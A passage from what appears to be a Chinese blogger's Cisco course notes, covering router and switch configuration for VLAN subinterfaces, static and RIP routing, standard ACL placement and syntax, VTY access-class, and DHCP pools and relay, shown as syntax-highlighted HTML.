class="hljs-params">if</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">0.10</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#encapsulation  dot1Q <span class="hljs-number">10</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#ip add <span class="hljs-number">172.31</span>.<span class="hljs-number">10.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">0.20</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#ip add <span class="hljs-number">172.31</span>.<span class="hljs-number">20.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">0.20</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#encapsulation d<br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#encapsulation dot1Q <span class="hljs-number">20</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#ip add <span class="hljs-number">172.31</span>.<span class="hljs-number">20.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">0.30</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#encapsulation dot1Q <span class="hljs-number">30</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#ip add <span class="hljs-number">172.31</span>.<span class="hljs-number">30.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">0.88</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#encapsulation dot1Q <span class="hljs-number">88</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#ip add <span class="hljs-number">172.31</span>.<span class="hljs-number">88.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">0.99</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#encapsulation dot1Q <span class="hljs-number">99</span> native  ## native!!!!!!!<br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">subif</span>)</span>#ip add <span class="hljs-number">172.31</span>.<span class="hljs-number">99.1</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><br><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>)</span>#vlan <span class="hljs-number">10</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Sales<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">20</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Production<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">30</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Marketing<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">88</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Management<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#vlan <span class="hljs-number">99</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#name Native<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">vlan</span>)</span>#ex<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>)</span>#<span class="hljs-built_in">int</span> vlan <span class="hljs-number">88</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#ip add <span class="hljs-number">172.31</span>.<span class="hljs-number">88.33</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#ex<br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>)</span>#ip default-gateway <span class="hljs-number">172.31</span>.<span class="hljs-number">88.1</span><br><span class="hljs-built_in">int</span> g0/<span class="hljs-number">1</span><br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw m trunk <br><span class="hljs-constructor">S1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#sw trunk native vlan <span class="hljs-number">99</span><br><br><span class="hljs-constructor">HQ(<span class="hljs-params">config</span>)</span>#ip route <span class="hljs-number">172.31</span>.<span class="hljs-number">10.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span> Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">HQ(<span class="hljs-params">config</span>)</span>#ip route <span class="hljs-number">172.31</span>.<span class="hljs-number">20.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span> Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">HQ(<span class="hljs-params">config</span>)</span>#ip route <span class="hljs-number">172.31</span>.<span class="hljs-number">30.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span> Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">HQ(<span class="hljs-params">config</span>)</span>#ip route <span class="hljs-number">172.31</span>.<span class="hljs-number">88.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span> Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">HQ(<span class="hljs-params">config</span>)</span>#ip route <span class="hljs-number">209.165</span>.<span class="hljs-number">200.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.224</span> Serial0/<span class="hljs-number">1</span>/<span class="hljs-number">0</span><br><span class="hljs-constructor">HQ(<span class="hljs-params">config</span>)</span>#ip route <span class="hljs-number">209.165</span>.<span class="hljs-number">200.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.224</span> Serial0/<span class="hljs-number">1</span>/<span class="hljs-number">1</span> <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h2 id="7-4-1-2"><a href="#7-4-1-2" class="headerlink" title="7.4.1.2 ??????"></a>7.4.1.2 ??????</h2><p>1.1.11100000.00000000</p><p>172.16.224</p><p>192~254</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">hostname</span> Branch<br>!<br>interface GigabitEthernet0/<span class="hljs-number">0</span><br>ip address <span class="hljs-number">172.16.159.254</span> <span class="hljs-number">255.255.240.0</span><br>ip access-group HQServer in<br><span class="hljs-literal">no</span> shut<br>!<br>interface GigabitEthernet0/<span class="hljs-number">1</span><br>ip address <span class="hljs-number">172.16.143.254</span> <span class="hljs-number">255.255.240.0</span><br><span class="hljs-literal">no</span> shut<br>!<br>interface Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br>ip address <span class="hljs-number">192.168.0.2</span> <span class="hljs-number">255.255.255.252</span><br><span class="hljs-literal">no</span> shut<br>!<br>router rip<br>version <span class="hljs-number">2</span><br>passive-interface GigabitEthernet0/<span class="hljs-number">0</span><br>passive-interface GigabitEthernet0/<span class="hljs-number">1</span><br>network <span class="hljs-number">172.16.0.0</span><br>network <span class="hljs-number">192.168.0.0</span><br><span class="hljs-literal">no</span> auto-summary<br>!<br>ip access-list standard HQServer<br>deny <span class="hljs-number">172.16.128.0</span> <span class="hljs-number">0.0.31.255</span><br>permit any<br><br><br><br>hostname HQ<br>!<br>interface GigabitEthernet0/<span class="hljs-number">0</span><br>ip address <span class="hljs-number">172.16.127.254</span> <span class="hljs-number">255.255.192.0</span><br>ip access-group BranchServer in<br><span class="hljs-literal">no</span> shut<br>!<br>interface GigabitEthernet0/<span class="hljs-number">1</span><br>ip address <span class="hljs-number">172.16.63.254</span> <span class="hljs-number">255.255.192.0</span><br><span class="hljs-literal">no</span> shut<br>!<br>interface Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">0</span><br>ip address <span class="hljs-number">192.168.0.1</span> <span class="hljs-number">255.255.255.252</span><br><span class="hljs-literal">no</span> shut<br>!<br>interface Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br>ip address <span class="hljs-number">64.104.34.2</span> <span class="hljs-number">255.255.255.252</span><br><span class="hljs-literal">no</span> shut<br>!<br>router rip<br>version <span class="hljs-number">2</span><br>passive-interface GigabitEthernet0/<span class="hljs-number">0</span><br>passive-interface GigabitEthernet0/<span class="hljs-number">1</span><br>passive-interface Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br>network <span class="hljs-number">172.16.0.0</span><br>network <span class="hljs-number">192.168.0.0</span><br>default-information originate<br><span class="hljs-literal">no</span> auto-summary<br>!<br>ip route <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">0.0.0.0</span> Serial0/<span class="hljs-number">0</span>/<span class="hljs-number">1</span><br>!<br>ip access-list standard BranchServer<br>deny <span class="hljs-number">172.16.64.0</span> <span class="hljs-number">0.0.63.255</span><br>permit any<br></code></pre></td></tr></table></figure><h2 id="5-27"><a href="#5-27" class="headerlink" title="5/27"></a>5/27</h2><h3 id="7-1-1-3-ACL"><a href="#7-1-1-3-ACL" class="headerlink" title="7.1.1.3 ACL"></a>7.1.1.3 ACL</h3><ul><li><strong>入站 ACL</strong> - 传入数据包经过处理之后才会被路由到出站接口。因为如果数据包被丢弃，就<strong>节省了执行路由查找</strong>的开销，所以入站 ACL 非常高效。如果 ACL 允许该数据包，则会处理该数据包以进行路由。当与入站接口连接的网络是需要检测的数据包的唯一来源时，最适合使用入站 ACL 来过滤数据包。(一进多出)</li><li><strong>出站 ACL</strong> - 传入数据包路由到出站接口后，由出站 ACL 进行处理。<strong>在来自多个入站接口的数据包通过同一出站接口之前，对数据包应用相同过滤器时，最适合使用出站 ACL。</strong>（多进一出）</li></ul><h3 id="7-1-2-5"><a href="#7-1-2-5" class="headerlink" title="7.1.2.5"></a>7.1.2.5</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">access-list <span class="hljs-number">1</span> permit any<br>!OR<br>access-list <span class="hljs-number">1</span> permit <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">255.255.255.255</span><br><br>access-list <span class="hljs-number">1</span> permit <span class="hljs-number">192.168.10.10</span> <span class="hljs-number">0.0.0.0</span><br>!OR<br>access-list <span class="hljs-number">1</span> permit host <span class="hljs-number">192.168.10.10</span><br></code></pre></td></tr></table></figure><p><strong>应用 ACL 的规则</strong></p><p>一些使用 ACL 的指导原则：</p><ul><li><p>在位于内部网络和外部网络（例如互联网）交界处的防火墙路由器上使用 ACL。</p></li><li><p>在位于网络两个部分交界处的路由器上使用 ACL，以控制进出内部网络特定部分的流量。</p></li><li><p>在边界路由器（即位于网络边界的路由器）上配置 ACL。这样可以在内外部网络之间，或网络中受控度较低的区域与敏感区域之间起到基本的缓冲作用。</p></li><li><p>为边界路由器接口上配置的每种网络协议配置 ACL。</p></li></ul><p>为每种协议 (per protocol)、每个方向 (per direction)、每个接口 (per interface) 配置一个 ACL：</p><ul><li><p><strong>每种协议一个 ACL</strong> - 要控制接口上的流量，必须为接口上启用的每种协议定义相应的 ACL。</p></li><li><p><strong>每个方向一个 ACL</strong> - 一个 ACL 只能控制接口上一个方向的流量。要控制入站流量和出站流量，必须分别定义两个 ACL。</p></li><li><p><strong>每个接口一个 ACL</strong> - 一个 ACL 只能控制一个接口（例如 GigabitEthernet 0/0）上的流量。</p></li></ul><h3 id="7-1-4-1-拓展acl和标准的使用情况"><a href="#7-1-4-1-拓展acl和标准的使用情况" class="headerlink" title="7.1.4.1 拓展acl和标准的使用情况??"></a>7.1.4.1 拓展acl和标准的使用情况??</h3><p><strong>扩展 ACL</strong> - 将扩展 ACL 放置在尽可能靠近需要过滤的流量源的位置上。这样，不需要的流量会在靠近源网络的位置遭到拒绝，而无需通过网络基础设施。</p><p><strong>标准 ACL</strong> - 由于标准 ACL 不会指定目标地址，所以其位置应该尽可能靠近目标。在<strong>流量源附近设置标准 ACL</strong> 可以有效阻止流量通过应用了 ACL 的接口到达任何其他网络。</p><p>标准 ACL 命令的完整语法如下：</p><p>Router(config)# <strong>access-list</strong> <em>access-list-number</em> { <strong>deny</strong> | <strong>permit</strong> | <strong>remark</strong> } <em>source</em> [ <em>source-wildcard</em> ] [ <strong>log</strong> ]</p><p>[ <em>source-wildcard</em> ] （可选）要应用到源得32位通配符掩码。在要忽略得位上置1。</p><h3 id="7-2-1-2"><a href="#7-2-1-2" class="headerlink" title="7.2.1.2"></a>7.2.1.2</h3><p>配置标准 IPv4 ACL 之后，可以在接口配置模式下使用 <strong>ip access-group</strong> 命令将其关联到接口：</p><p>Router(config-if)# <strong>ip access-group</strong> { <em>access-list-number</em> | <em>access-list-name</em> } { <strong>in</strong> | <strong>out</strong> }</p><p>in/out 入站 出站过滤器</p><h3 id="7-2-1-3"><a href="#7-2-1-3" class="headerlink" title="7.2.1.3"></a>7.2.1.3</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200527092034631.png" class="" title="image-20200527092034631"><p>拒绝位于 192.168.10.10 的主机 PC1。但允许 192.168.10.0/24 网络中的其他各台主机。</p><h3 id="7-2-2-3"><a href="#7-2-2-3" class="headerlink" title="7.2.2.3"></a>7.2.2.3</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200527101158208.png" class="" title="image-20200527101158208"><p>show ip interface 端口</p><h3 id="7-2-3-1"><a href="#7-2-3-1" class="headerlink" title="7.2.3.1"></a>7.2.3.1</h3><p>线路配置模式中配置的 <strong>access-class</strong> 命令可限制特定 VTY（接入思科设备）与访问列表中地址之间的传入和传出连接。</p><p><strong>access-class</strong> 命令的语法是：</p><p>Router(config-line)# <strong>access-class</strong> <em>access-list-number</em> { <strong>in</strong> [ <strong>vrf-also</strong> ] | <strong>out</strong> }</p><p>==参数 <strong>in</strong> 限制访问列表中的地址和思科设备之间的传入连接，而参数 <strong>out</strong> 则限制特定思科设备与访问列表中地址之间的传出连接。==</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200527102513372.png" class="" title="image-20200527102513372"><h3 id="7-3-1-2"><a href="#7-3-1-2" class="headerlink" title="7.3.1.2"></a>7.3.1.2</h3><p>思科 IOS 将应用内部逻辑。如前所述，ACE 是按照顺序处理的；因此，ACE 的输入顺序非常重要。</p><h3 id="8-1-2-1-dhcp"><a href="#8-1-2-1-dhcp" class="headerlink" title="8.1.2.1 dhcp"></a>8.1.2.1 dhcp</h3><p>要排除特定地址，请使用 <strong>ip dhcp excluded-address</strong> 命令。</p><p><strong>ip dhcp pool</strong> <em>池名称</em> 命令创建具有特定名称的地址池，并使路由器进入 DHCPv4 配置模式</p><p>必须配置地址池和默认网关路由器。使用 <strong>network</strong> 语句定义可用地址范围。</p><p>使用 <strong>default-router</strong> 命令定义默认网关路由器。通常，网关是最接近客户端设备的路由器的 LAN 接口。虽然只需要一个网关，但是如果有多个网关，您最多可以列出八个地址。</p><p>其他 DHCPv4 池命令为可选命令。例如，使用 <strong>dns-server</strong> 命令配置 DHCPv4 客户端可用的 DNS 服务器 IPv4 地址。<strong>domain-name</strong> <em>domain</em> 命令用于定义域名。使用 <strong>lease</strong> 命令可以更改 DHCPv4 租期。默认租用值为一天。<strong>netbios-name-server</strong> 命令用于定义 NetBIOS WINS 服务器。</p><p>要禁用此服务，请使用 <strong>no service dhcp</strong> 全局配置模式命令。使用 <strong>service dhcp</strong> 全局配置模式命令可重新启用 DHCPv4 服务器进程。如果没有配置参数，启用服务将不会有效果。</p><h3 id="8-1-2-3-dhcp中继"><a href="#8-1-2-3-dhcp中继" class="headerlink" title="8.1.2.3 dhcp中继"></a>8.1.2.3 dhcp中继</h3><p>如果将 R1 配置为 DHCPv4 中继代理，它会将请求转发至位于子网 192.168.11.0 的 DHCPv4 服务器。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">R3(<span class="hljs-params">config</span>)</span># interface g0/<span class="hljs-number">0</span><br><span class="hljs-constructor">R3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip helper-address <span class="hljs-number">192.168</span>.<span class="hljs-number">11.6</span><br></code></pre></td></tr></table></figure><h2 id="7-2-1-6"><a href="#7-2-1-6" class="headerlink" title="7.2.1.6"></a>7.2.1.6</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">R2</span><span class="hljs-params">(config)</span></span><span class="hljs-number">#acc</span>ess-list <span class="hljs-number">1</span> deny <span class="hljs-number">192.168</span>.<span class="hljs-number">11.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.255</span><br><span class="hljs-function"><span class="hljs-title">R2</span><span class="hljs-params">(config)</span></span><span class="hljs-number">#acc</span>ess-list <span class="hljs-number">1</span> permit any<br><br><span class="hljs-function"><span class="hljs-title">R3</span><span class="hljs-params">(config)</span></span><span class="hljs-number">#acc</span>ess-list <span class="hljs-number">1</span> deny <span class="hljs-number">192.168</span>.<span class="hljs-number">10.0</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.255</span><br><span class="hljs-function"><span class="hljs-title">R3</span><span class="hljs-params">(config)</span></span><span class="hljs-number">#acc</span>ess-list <span class="hljs-number">1</span> permit any<br><span class="hljs-function"><span class="hljs-title">R3</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> g0/<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">R3</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#ip</span> access-group <span class="hljs-number">1</span> out<br></code></pre></td></tr></table></figure><h2 id="7-2-1-7"><a href="#7-2-1-7" class="headerlink" title="7.2.1.7"></a>7.2.1.7</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#ip</span> access-list standard File_Server_Restrictions<br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-std-nacl)</span></span><span class="hljs-selector-id">#permit</span> host <span class="hljs-number">192.168</span>.<span class="hljs-number">20.4</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-std-nacl)</span></span><span class="hljs-selector-id">#deny</span> any<br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#int</span> f0/<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">R1</span><span class="hljs-params">(config-if)</span></span><span class="hljs-selector-id">#ip</span> access-group File_Server_Restrictions out<br></code></pre></td></tr></table></figure><h2 id="7-2-3-3"><a href="#7-2-3-3" class="headerlink" title="7.2.3.3"></a>7.2.3.3</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Router</span><span class="hljs-params">(config)</span></span><span class="hljs-number">#acc</span>ess-list <span class="hljs-number">99</span> permit host <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-function"><span class="hljs-title">Router</span><span class="hljs-params">(config)</span></span><span class="hljs-selector-id">#line</span> vty <span class="hljs-number">0</span> <span class="hljs-number">15</span><br><span class="hljs-function"><span class="hljs-title">Router</span><span class="hljs-params">(config-line)</span></span><span class="hljs-number">#acc</span>ess-class <span class="hljs-number">99</span> i<br></code></pre></td></tr></table></figure><h2 id="8-1-3-3"><a href="#8-1-3-3" class="headerlink" title="8.1.3.3"></a>8.1.3.3</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span>#ip dhcp excluded-address <span class="hljs-number">192.168</span>.<span class="hljs-number">10.1</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">10.10</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span>#ip dhcp excluded-address <span class="hljs-number">19</span>IP2.<span class="hljs-number">168.30</span>.<span class="hljs-number">1</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">30.10</span><br><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span>#ip dhcp pool R1-LAN<br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#network <span class="hljs-number">192.168</span>.<span class="hljs-number">10.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#default-router <span class="hljs-number">10.1</span>.<span class="hljs-number">1.2</span><br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#no default-router <span class="hljs-number">10.1</span>.<span class="hljs-number">1.2</span><br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#default-router <span class="hljs-number">192.168</span>.<span class="hljs-number">10.1</span><br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#dns-server <span class="hljs-number">192.168</span>.<span class="hljs-number">20.254</span><br><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span>#ip dhcp pool R3-LAN<br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#netw<br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#network <span class="hljs-number">192.168</span>.<span class="hljs-number">30.0</span> <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#dns<br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#dns-server <span class="hljs-number">192.168</span>.<span class="hljs-number">20.254</span><br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#def<br><span class="hljs-constructor">R2(<span class="hljs-params">dhcp</span>-<span class="hljs-params">config</span>)</span>#default-router <span class="hljs-number">192.168</span>.<span class="hljs-number">30.1</span><br><br><br><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">0</span><br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#ip dh<br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#ip he<br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#ip help<br><span class="hljs-constructor">R1(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#ip helper-address <span class="hljs-number">10.1</span>.<span class="hljs-number">1.2</span><br><br><span class="hljs-constructor">R3(<span class="hljs-params">config</span>)</span>#<span class="hljs-built_in">int</span> g0/<span class="hljs-number">0</span><br><span class="hljs-constructor">R3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#ip help<br><span class="hljs-constructor">R3(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span>#ip helper-address <span class="hljs-number">10.2</span>.<span class="hljs-number">2.2</span><br><br><span class="hljs-comment">//Step 1: Configure the Gigabit Ethernet 0/1 interface on R2 to receive IP addressing from DHCP and activate the interface.</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>)</span># interface g0/<span class="hljs-number">1</span><br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># ip address dhcp<br><span class="hljs-constructor">R2(<span class="hljs-params">config</span>-<span class="hljs-params">if</span>)</span># no shutdown<br></code></pre></td></tr></table></figure><h2 id="8-3-1-2"><a href="#8-3-1-2" class="headerlink" title="8.3.1.2"></a>8.3.1.2</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">S2</span><span 